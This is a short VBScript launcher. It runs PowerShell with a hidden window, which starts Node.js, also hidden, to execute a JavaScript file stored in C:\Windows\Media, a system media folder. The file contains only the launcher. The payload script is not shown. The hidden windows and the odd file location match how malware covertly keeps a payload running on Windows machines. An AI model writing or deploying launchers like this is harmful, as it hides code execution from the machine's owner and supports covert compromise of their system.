Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -NoProfile -WindowStyle Hidden -Command ""Start-Process -FilePath 'C:\Program Files\nodejs\node.exe' -ArgumentList 'C:\Windows\Media\app.js' -WorkingDirectory 'C:\Windows\Media' -WindowStyle Hidden""", 0, False
